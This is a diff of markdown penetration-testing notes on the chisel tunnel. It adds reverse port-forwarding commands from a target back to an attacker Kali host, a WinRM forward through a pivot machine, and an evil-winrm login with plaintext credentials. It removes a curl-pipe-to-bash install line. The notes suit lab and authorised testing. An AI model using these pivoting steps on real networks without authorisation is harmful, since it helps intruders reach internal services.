@@ -19,8 +19,7 @@ Chisel is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH. Single 
 ## Installation
 [chisel](https://github.com/jpillora/chisel)
 
-For linux:
-`curl https://i.jpillora.com/chisel! | bash`
+If you go to releases you can download the exe by OS. I typically use `chisel_1.8.1_linux_amd64` for my Kali machine and Linux targets
 
 For Windows:
 Go to the release page, get URL for 32bit or 64bit ( I used https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_windows_386.gz), wget, gunzip, change name to chisel.exe
@@ -28,14 +27,24 @@ Go to the release page, get URL for 32bit or 64bit ( I used https://github.com/j
 
 ## Commands
 
-to forward winrm:
+### Port to Port proxy
+This will be way faster than a socks proxy, do it this way if you need to visit a webpage or just need to port foward to one service
+```
+On kali:
+./chisel server --reverse -p 9090
+On target:
+./chisel client 10.10.14.80:9090 R:8001:127.0.0.1:8001
+```
+In this example just visit `http://127.0.0.1:8001` in the browser without a proxy and you should hit the internal webpage.
+
+**to forward winrm:**
 your machine
 `./chisel server --reverse -p 9002
 
-pivot machine
+pivot machine:
 `./chisel client <your_machine>:9002 R:5985:172.16.22.1:5985
 
-
+Login with evil-winrm:
 `evil-winrm -i 10.10.14.95 -u 'matthew' -p '147258369'
 
 ### socks server
